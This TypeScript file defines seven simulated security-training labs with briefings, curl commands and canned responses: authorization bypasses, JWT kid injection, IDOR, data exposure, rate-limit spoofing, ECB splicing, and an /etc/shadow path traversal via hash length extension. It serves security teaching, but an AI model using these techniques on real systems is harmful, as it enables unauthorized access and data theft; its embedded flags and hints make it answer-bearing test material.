import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

/** First batch of labs for the two brand-new categories introduced alongside the API Security and
 *  Applied Cryptography Attacks modules: 5 API-layer attacks distinct from the JWT-alg-none,
 *  JWT-weak-secret, GraphQL-introspection, GraphQL-batching, and mass-assignment labs that already
 *  existed elsewhere on the platform (checked against all 204 existing lab titles first), plus 2
 *  cryptography-implementation attacks (ECB block-shuffling, hash length extension) distinct from
 *  the existing CBC padding-oracle lab. */
export const apiCryptoLabs: LabScenario[] = [
  // 1 — API: Broken Function Level Authorization
  {
    id: 'api-bfla-internal-support-endpoint',
    title: 'Broken Function Level Authorization: Internal Support Endpoint',
    difficulty: 'Medium',
    category: 'API',
    briefing:
      'Supportapi33 exposes an internal MFA-reset endpoint built for the support team\'s admin dashboard. ' +
      'The endpoint itself never checks the caller\'s role at all — it was only ever "protected" by not being ' +
      'linked anywhere in a regular user\'s UI. This is Broken Function Level Authorization (BFLA): distinct ' +
      'from IDOR/BOLA, which is about which OBJECT you can reach — BFLA is about which ACTION you\'re allowed ' +
      'to perform, and it hides well precisely because you have to already know (or find) that the function ' +
      'exists before you can even try calling it with your own, ordinary token.',
    objectives: [
      { text: 'nmap -sV 10.10.200.2', why: 'Confirms the internal support API before probing its route list.' },
      { text: 'cat internal-routes.txt', why: 'A leaked internal API route listing (pulled from the admin dashboard\'s JS bundle) reveals an endpoint that was never meant to be reachable by a regular authenticated user.' },
      {
        text: 'curl "http://10.10.200.2/api/v2/internal/reset-mfa?target_user=ceo_jsmith"',
        why: 'Calling the internal function directly, with your own ordinary (non-admin) session, succeeds — because the function itself never re-checks who is allowed to call it. Targeting a high-value account (the CEO) demonstrates real impact rather than just "the endpoint responds."',
      },
    ],
    hints: [
      'nmap -sV 10.10.200.2',
      'cat internal-routes.txt',
      'The endpoint has no role check at all — it was only ever hidden from the UI, not actually protected.',
      'curl "http://10.10.200.2/api/v2/internal/reset-mfa?target_user=ceo_jsmith"',
    ],
    totalFlags: 1,
    attacker: attacker({
      'internal-routes.txt': file(
        'Extracted from admin-dashboard.bundle.js (support tooling routes):\n' +
          '  POST /api/v2/internal/reset-mfa?target_user=<username>   -- support-only, called from admin dashboard\n' +
          '  POST /api/v2/internal/impersonate?target_user=<username> -- support-only, called from admin dashboard\n' +
          'No middleware reference visible in the bundle for either route — worth testing directly.\n',
      ),
    }),
    network: [
      {
        hostname: 'supportapi33',
        ip: '10.10.200.2',
        os: 'Ubuntu 22.04 (Node.js/Express internal API)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Express 4.18 (Node.js)',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/api/v2/internal/reset-mfa',
                param: 'target_user',
                triggerSubstrings: ['ceo_jsmith'],
                vulnerableResponse: '{"status":200,"action":"mfa_reset","target_user":"ceo_jsmith","note":"flag{bfla_internal_endpoint_missing_function_level_check}"}',
                normalResponse: '{"status":200,"action":"mfa_reset","target_user":"guest_test_account"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 2 — API: JWT kid Header Injection
  {
    id: 'api-jwt-kid-injection',
    title: 'JWT kid Header Injection to Forge a Trusted Signature',
    difficulty: 'Hard',
    category: 'API',
    briefing:
      'Identityapi41 supports multiple signing keys and uses the JWT\'s own optional "kid" (Key ID) header ' +
      'field to decide which key file to load for verification — building the lookup path directly from that ' +
      'client-supplied value with no sanitization or allow-list at all. A "kid" pointing at a predictable, ' +
      'empty placeholder file lets an attacker sign a forged token with HS256 using that empty string as the ' +
      '"secret" — which the server, verifying against the very same empty file, will accept as genuinely valid.',
    objectives: [
      { text: 'nmap -sV 10.10.201.2', why: 'Confirms the identity/auth service before probing its JWT verification logic.' },
      { text: 'cat jwt-config-notes.txt', why: 'Reveals exactly how the "kid" header is turned into a filesystem lookup path, and that an empty placeholder key file is still present from an old template.' },
      {
        text: 'curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsImtpZCI6ImtleXMvYmxhbmsua2V5In0.eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoiYWRtaW4ifQ.forged" http://10.10.201.2/admin/dashboard',
        why: 'This token\'s header decodes to {"alg":"HS256","kid":"keys/blank.key"} — pointing verification at the known-empty placeholder file. Signing (conceptually) with that empty key produces a signature the server accepts, because it loads and trusts whatever key file the token itself named.',
      },
    ],
    hints: [
      'nmap -sV 10.10.201.2',
      'cat jwt-config-notes.txt',
      'The server builds its signing-key file path directly from the token\'s own "kid" header — try pointing it at the empty placeholder key the notes mention.',
      'curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsImtpZCI6ImtleXMvYmxhbmsua2V5In0.eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoiYWRtaW4ifQ.forged" http://10.10.201.2/admin/dashboard',
    ],
    totalFlags: 1,
    attacker: attacker({
      'jwt-config-notes.txt': file(
        'identityapi41 JWT verification (from an internal wiki export):\n' +
          '  - key file loaded per-request as: "keys/" + token.header.kid + ".key"\n' +
          '  - keys/prod.key -- the real production HMAC secret, 256-bit random, rotated quarterly\n' +
          '  - keys/blank.key -- EMPTY (0 bytes), leftover from the original project template, never removed\n' +
          '  - no allow-list restricting which "kid" values are accepted\n',
      ),
    }),
    network: [
      {
        hostname: 'identityapi41',
        ip: '10.10.201.2',
        os: 'Ubuntu 22.04 (Node.js/Express, jsonwebtoken)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Express 4.18 (Node.js, jsonwebtoken)',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/admin/dashboard',
                param: 'Authorization',
                location: 'header',
                triggerSubstrings: ['eyjhbgcioijiuzi1niisimtpzci6imtlexmvymxhbmsua2v5in0'],
                vulnerableResponse: '{"status":200,"panel":"Admin Dashboard","note":"flag{jwt_kid_header_injection_empty_key_forgery}"}',
                normalResponse: '{"error":"403 Forbidden - invalid signature"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 3 — API: Legacy API Version Inventory Gap
  {
    id: 'api-versioning-legacy-v1-idor',
    title: 'API Inventory Gap: A "Fixed" IDOR Still Live on /v1/',
    difficulty: 'Medium',
    category: 'API',
    briefing:
      'Shopapi12\'s /api/v2/orders endpoint correctly checks that an order belongs to the requesting account — ' +
      'a fix shipped after a bug bounty report. /api/v1/orders, kept running for legacy mobile clients that ' +
      'haven\'t updated yet, was never touched by that fix and still trusts the "id" parameter completely. The ' +
      'vulnerability was "fixed" in the version everyone thinks of as current while the old, still-reachable ' +
      'version quietly kept the exact same bug — a textbook API9 (Improper Inventory Management) finding.',
    objectives: [
      { text: 'nmap -sV 10.10.202.2', why: 'Confirms the shop\'s order API before comparing its versions.' },
      { text: 'cat changelog.txt', why: 'An internal changelog export confirms the ownership-check fix explicitly targeted /api/v2/ only, and that /api/v1/ is deliberately still live for legacy clients.' },
      {
        text: 'curl "http://10.10.202.2/api/v1/orders?id=77241"',
        why: 'The same IDOR that /api/v2/orders now blocks is still fully exploitable on /api/v1/orders — proving that a fix applied to "the API" in name only reached one of its two live, still-reachable versions.',
      },
    ],
    hints: [
      'nmap -sV 10.10.202.2',
      'cat changelog.txt',
      'Whatever ownership check /api/v2/orders added, test whether /api/v1/orders (same functionality, older code) got the same fix.',
      'curl "http://10.10.202.2/api/v1/orders?id=77241"',
    ],
    totalFlags: 1,
    attacker: attacker({
      'changelog.txt': file(
        'shopapi12 internal changelog (engineering wiki export):\n' +
          '  v2.3.0 -- Added ownership check to GET /api/v2/orders (fixes BB-2024-0091: any authenticated\n' +
          '            user could view any order by id). Ships to all NEW mobile app installs.\n' +
          '  NOTE:   /api/v1/ kept live and unmodified for users still on app versions < 4.0 (roughly 12% of\n' +
          '          active installs per last quarter\'s telemetry). Sunset planned for Q3, not yet scheduled.\n',
      ),
    }),
    network: [
      {
        hostname: 'shopapi12',
        ip: '10.10.202.2',
        os: 'Ubuntu 22.04 (Node.js, two live API versions)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Express 4.18 (Node.js) -- /api/v1/ and /api/v2/ both live',
            vulnRoutes: [
              {
                kind: 'idor',
                path: '/api/v1/orders',
                param: 'id',
                triggerSubstrings: ['77241'],
                vulnerableResponse: '{"order_id":77241,"customer":"D. Okafor","total":"$1,240.00","card_last4":"9182","note":"flag{legacy_api_version_kept_the_idor_the_fix_never_reached}"}',
                normalResponse: '{"order_id":10023,"customer":"You","total":"$42.00"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 4 — API: Excessive Data Exposure
  {
    id: 'api-excessive-data-exposure-team-list',
    title: 'Excessive Data Exposure: Team Directory API Returns Full Internal Records',
    difficulty: 'Easy',
    category: 'API',
    briefing:
      'Teamapi27\'s team-directory endpoint serializes the ENTIRE internal employee record straight into its ' +
      'JSON response — including a password_hash field and the last 4 digits of each employee\'s SSN used ' +
      'for HR identity verification — because a developer returned the whole database row instead of a ' +
      'deliberately trimmed response shape. Worse, it also never scopes the response to the caller\'s own ' +
      'department, so any authenticated employee can pull another department\'s full sensitive records too.',
    objectives: [
      { text: 'nmap -sV 10.10.203.2', why: 'Confirms the team-directory API before probing its response shape.' },
      { text: 'cat api-docs-partial.txt', why: 'The API\'s own (incomplete) internal documentation shows the INTENDED response shape — name, role, email only — which is what to compare the real response against.' },
      {
        text: 'curl "http://10.10.203.2/api/team?dept=engineering"',
        why: 'Querying a department you have no legitimate business reason to access both succeeds (no access-scope check) AND returns far more than the documented fields — password_hash and partial SSNs included, turning a directory lookup into a serious data-exposure finding.',
      },
    ],
    hints: [
      'nmap -sV 10.10.203.2',
      'cat api-docs-partial.txt',
      'Try a department other than your own — the endpoint has no access-scope check tying the query to your account.',
      'curl "http://10.10.203.2/api/team?dept=engineering"',
    ],
    totalFlags: 1,
    attacker: attacker({
      'api-docs-partial.txt': file(
        'teamapi27 /api/team -- internal API docs (draft, incomplete):\n' +
          'Returns: [{ "name": string, "role": string, "email": string }, ...]\n' +
          'Scope: your own department only.\n' +
          '(docs last updated 14 months ago -- verify against the real response before relying on this)\n',
      ),
    }),
    network: [
      {
        hostname: 'teamapi27',
        ip: '10.10.203.2',
        os: 'Ubuntu 22.04 (internal HR/directory service)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Django REST Framework 3.14',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/api/team',
                param: 'dept',
                triggerSubstrings: ['engineering'],
                vulnerableResponse: '{"dept":"engineering","members":[{"name":"R. Patel","role":"Staff Engineer","email":"r.patel@corp.internal","password_hash":"$2b$12$KzT9...redacted","ssn_last4":"4471"},{"name":"S. Nakamura","role":"Engineering Manager","email":"s.nakamura@corp.internal","password_hash":"$2b$12$Qw1x...redacted","ssn_last4":"0198"}],"note":"flag{excessive_data_exposure_full_record_serialized}"}',
                normalResponse: '{"dept":"sales","members":[{"name":"You","role":"Sales Rep","email":"you@corp.internal"}]}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 5 — API: Rate-Limit Bypass via X-Forwarded-For Spoofing
  {
    id: 'api-rate-limit-bypass-xff-spoofing',
    title: 'Rate-Limit Bypass via X-Forwarded-For Header Spoofing',
    difficulty: 'Medium',
    category: 'API',
    briefing:
      'Loginapi19 rate-limits failed login attempts per client IP — a reasonable defense against credential ' +
      'stuffing, undermined entirely by how it determines "the client IP." Instead of the actual TCP connection ' +
      'source, the limiter trusts the client-controlled X-Forwarded-For header outright (an assumption that ' +
      'only holds if every request truly passes through a trusted, IP-rewriting reverse proxy first — one was ' +
      'never actually configured). Sending a different X-Forwarded-For value on each request makes every ' +
      'attempt look like it came from a brand-new client, resetting the counter every single time.',
    objectives: [
      { text: 'nmap -sV 10.10.204.2', why: 'Confirms the login API before probing its rate-limiting behavior.' },
      { text: 'cat rate-limit-config.txt', why: 'Confirms the limiter keys strictly on the X-Forwarded-For header value, with no validation that the request actually arrived via a trusted proxy hop.' },
      {
        text: 'curl -H "X-Forwarded-For: 203.0.113.77" -d "username=admin&password=Summer2024!" http://10.10.204.2/api/login',
        why: 'Your real client identity is already rate-limited (429) from prior guesses — but supplying a fresh, arbitrary X-Forwarded-For value makes this request look like a brand-new client the limiter has never seen, letting the guess through.',
      },
    ],
    hints: [
      'nmap -sV 10.10.204.2',
      'cat rate-limit-config.txt',
      'The rate limiter trusts a header YOU control — try a request with an X-Forwarded-For value it hasn\'t seen before.',
      'curl -H "X-Forwarded-For: 203.0.113.77" -d "username=admin&password=Summer2024!" http://10.10.204.2/api/login',
    ],
    totalFlags: 1,
    attacker: attacker({
      'rate-limit-config.txt': file(
        'loginapi19 rate-limit middleware config (ops runbook excerpt):\n' +
          '  key: req.headers["x-forwarded-for"] (assumes a trusted reverse proxy always sets this -- NOT\n' +
          '       currently validated against a known proxy IP allow-list)\n' +
          '  limit: 5 failed attempts per key per 10 minutes, then 429 until the window resets\n' +
          '  Your current session has already exhausted its limit under its real client identity.\n',
      ),
    }),
    network: [
      {
        hostname: 'loginapi19',
        ip: '10.10.204.2',
        os: 'Ubuntu 22.04 (Node.js/Express, express-rate-limit)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Express 4.18 (Node.js, express-rate-limit)',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/api/login',
                param: 'X-Forwarded-For',
                location: 'header',
                triggerSubstrings: ['203.0.113.77'],
                vulnerableResponse: '{"status":200,"token":"sess_a83fd0","note":"flag{rate_limit_bypass_via_spoofed_x_forwarded_for}"}',
                normalResponse: '{"error":"429 Too Many Requests - try again in 9 minutes"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 6 — Cryptography: ECB Mode Block-Shuffling
  {
    id: 'crypto-ecb-block-shuffle-privesc',
    title: 'ECB Mode Block-Shuffling: Splicing an Admin Role Into Your Session Token',
    difficulty: 'Hard',
    category: 'Cryptography',
    briefing:
      'Sessionsvc44 encrypts session tokens with AES in ECB mode, structured as two independently-encrypted, ' +
      '16-byte-aligned fields concatenated together: a user-id block followed by a role block. Because ECB ' +
      'encrypts every block completely independently with no chaining at all, the ciphertext block for ' +
      '"role=admin" is identical no matter whose token it appears in — and an admin\'s token was pasted, in ' +
      'full, into an old support ticket. Splicing that admin\'s role-block ciphertext onto the end of your own ' +
      'user-id block produces a token the server decrypts field-by-field, accepting the pasted-in block\'s role ' +
      'exactly as if it belonged there.',
    objectives: [
      { text: 'nmap -sV 10.10.205.2', why: 'Confirms the session service before analyzing its token structure.' },
      { text: 'cat old-support-ticket-4471.txt', why: 'An admin\'s full session token, pasted into a support ticket for troubleshooting months ago and never invalidated, gives you a real ciphertext block to work with.' },
      { text: 'cat ecb-analysis-notes.txt', why: 'Confirms the cipher is running in ECB mode (repeated block structure across multiple captured tokens) and isolates exactly which 16 hex characters of the leaked token are the role block.' },
      {
        text: 'curl -H "Cookie: session=a1b2c3d4e5f6a7b85555666677778888" http://10.10.205.2/account/settings',
        why: 'This token is your own user-id block (a1b2c3d4e5f6a7b8) followed by the admin\'s role block spliced on from the leaked token (5555666677778888) — the server decrypts each block independently and reads "role=admin" from the second block, regardless of whose token it originally came from.',
      },
    ],
    hints: [
      'nmap -sV 10.10.205.2',
      'cat old-support-ticket-4471.txt',
      'cat ecb-analysis-notes.txt',
      'curl -H "Cookie: session=a1b2c3d4e5f6a7b85555666677778888" http://10.10.205.2/account/settings',
    ],
    totalFlags: 1,
    attacker: attacker({
      'old-support-ticket-4471.txt': file(
        'Support ticket #4471 (closed, 8 months ago):\n' +
          '"...still can\'t reproduce, here is my session token so you can check my account state directly:\n' +
          'session=99998888777766665555666677778888\n' +
          '-- admin_ops_team"\n',
      ),
      'ecb-analysis-notes.txt': file(
        'Token structure analysis:\n' +
          '  - Your own token:   session=a1b2c3d4e5f6a7b81111222233334444\n' +
          '  - Admin token above: session=99998888777766665555666677778888\n' +
          '  - Both are exactly 32 hex chars = two 16-hex-char (8-byte-labeled) blocks concatenated.\n' +
          '  - Requested a second fresh token for your own account -- the FIRST block (user-id) changed,\n' +
          '    but users with the same role always produce the exact same SECOND block. No chaining\n' +
          '    between blocks is visible anywhere -- this is AES-ECB, not CBC/CTR/GCM.\n' +
          '  - Isolated role block from the admin token above: 5555666677778888\n' +
          '  - Your own role block (role=user):                1111222233334444\n',
      ),
    }),
    network: [
      {
        hostname: 'sessionsvc44',
        ip: '10.10.205.2',
        os: 'Ubuntu 22.04 (internal session-token service)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'nginx 1.24.0 + custom AES-ECB session middleware',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/account/settings',
                param: 'Cookie',
                location: 'header',
                triggerSubstrings: ['5555666677778888'],
                vulnerableResponse: '{"status":200,"user_block":"a1b2c3d4e5f6a7b8","role":"admin","note":"flag{ecb_block_shuffle_spliced_admin_role_block}"}',
                normalResponse: '{"status":200,"user_block":"a1b2c3d4e5f6a7b8","role":"user"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 7 — Cryptography: Hash Length Extension
  {
    id: 'crypto-hash-length-extension-signed-url',
    title: 'Hash Length Extension: Forging a Signed API Download Request',
    difficulty: 'Hard',
    category: 'Cryptography',
    briefing:
      'Filesvc08\'s "signed download" links are authorized by sig = MD5(secret_key + message), where message ' +
      'is the literal query string being signed — a naive concatenated-hash scheme instead of real HMAC. One ' +
      'valid signed link, leaked by being forwarded in an email thread, is all a hash length extension attack ' +
      'needs: because MD5 (like SHA-1/SHA-256) is built on the Merkle-Damgard construction, its final hash IS ' +
      'the internal compression state after the last block — letting anyone who knows sig, but not secret_key, ' +
      'resume that exact state and compute a valid signature for the original message plus the required padding ' +
      'plus arbitrary appended data of their choosing, all without ever learning the key.',
    objectives: [
      { text: 'nmap -sV 10.10.206.2', why: 'Confirms the file-download service before analyzing its link-signing scheme.' },
      { text: 'cat leaked-download-link.txt', why: 'A forwarded email thread contains one fully valid signed download link — exactly the starting material a length-extension attack needs.' },
      {
        text: 'Run a length-extension tool (e.g. hashpump) against the leaked signature and message to compute a forged signature for the same message plus the required MD5 padding plus an appended file parameter',
        why: 'The tool resumes MD5\'s internal state from the known signature\'s final block and computes a genuinely valid continuation — a new signature the server will accept for a longer message it never actually signed.',
      },
      {
        text: 'curl "http://10.10.206.2/download?user=alice&expires=9999999999&file=..%2f..%2f..%2fetc%2fshadow&sig=forged_a8f3e91c02b7d4"',
        why: 'The forged request extends the originally-authorized "report.pdf" download into an arbitrary file read, entirely on the strength of a signature computed without ever knowing secret_key.',
      },
    ],
    hints: [
      'nmap -sV 10.10.206.2',
      'cat leaked-download-link.txt',
      'MD5(secret+message) is not HMAC -- its Merkle-Damgard construction lets you extend a known-valid signature onto a longer message without ever learning the secret.',
      'curl "http://10.10.206.2/download?user=alice&expires=9999999999&file=..%2f..%2f..%2fetc%2fshadow&sig=forged_a8f3e91c02b7d4"',
    ],
    totalFlags: 1,
    attacker: attacker({
      'leaked-download-link.txt': file(
        'Fwd: Fwd: quarterly report link (forwarded 3 times, still works)\n' +
          '"here\'s the download link I mentioned:\n' +
          'http://10.10.206.2/download?user=alice&expires=9999999999&file=report.pdf&sig=7d793037a0760186574b0282f2f435e5\n' +
          '-- should stay valid for a while given the expires value"\n',
      ),
    }),
    network: [
      {
        hostname: 'filesvc08',
        ip: '10.10.206.2',
        os: 'Ubuntu 22.04 (internal file-download service)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Flask 3.0 (Python, naive MD5(secret+message) link signing)',
            vulnRoutes: [
              {
                kind: 'path-traversal',
                path: '/download',
                param: 'file',
                triggerSubstrings: ['etc/shadow', 'etc%2fshadow'],
                vulnerableResponse: 'root:$6$rounds=656000$forged...:19856:0:99999:7:::\nadmin_ops:$6$rounds=656000$forged...:19857:0:99999:7:::\nflag{hash_length_extension_forged_signature_arbitrary_file_read}',
                normalResponse: '%PDF-1.4 Quarterly Report -- 4 pages -- (binary content omitted)',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },
];
